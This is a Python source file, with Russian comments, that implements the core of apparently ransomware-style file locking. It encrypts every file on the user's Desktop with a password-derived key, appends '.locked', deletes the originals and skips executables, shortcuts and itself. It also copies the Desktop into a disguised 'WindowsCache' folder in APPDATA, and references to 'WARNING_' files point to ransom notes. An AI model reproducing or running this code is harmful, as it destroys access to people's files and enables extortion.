import os
import sys
import base64
import hashlib
import zipfile
from cryptography.fernet import Fernet

class CryptoManager:
    def __init__(self, password):
        self.key = base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest())
        self.f = Fernet(self.key)
        self.target_dir = os.path.join(os.path.expanduser("~"), "Desktop")
        self.current_script = os.path.abspath(sys.argv[0])

    def create_backup(self):
        """Создает аварийный ZIP-бэкап перед шифрованием"""
        backup_dir = os.path.join(os.getenv('APPDATA'), "WindowsCache")
        os.makedirs(backup_dir, exist_ok=True)
        backup_zip = os.path.join(backup_dir, "emergency_backup.zip")
        try:
            with zipfile.ZipFile(backup_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(self.target_dir):
                    for file in files:
                        if file.endswith('.locked') or file.startswith('WARNING_'):
                            continue
                        path = os.path.join(root, file)
                        arcname = os.path.relpath(path, self.target_dir)
                        zipf.write(path, arcname)
        except: pass

    def encrypt_all(self):
        self.create_backup() # Сначала бэкап!
        if not os.path.exists(self.target_dir): return
        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                if file.endswith(('.locked', '.exe', '.lnk', '.ini')) or file.startswith('WARNING_'):
                    continue
                path = os.path.join(root, file)
                if os.path.abspath(path) == self.current_script: continue
                try:
                    with open(path, "rb") as fh: data = fh.read()
                    enc = self.f.encrypt(data)
                    with open(path + ".locked", "wb") as fh: fh.write(enc)
                    os.remove(path)
                except: pass

    def decrypt_all(self):
        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                if file.endswith('.locked'):
                    path = os.path.join(root, file)
                    try:
                        with open(path, "rb") as fh: data = fh.read()
                        dec = self.f.decrypt(data)
                        with open(path[:-7], "wb") as fh: fh.write(dec)
                        os.remove(path)
                    except: pass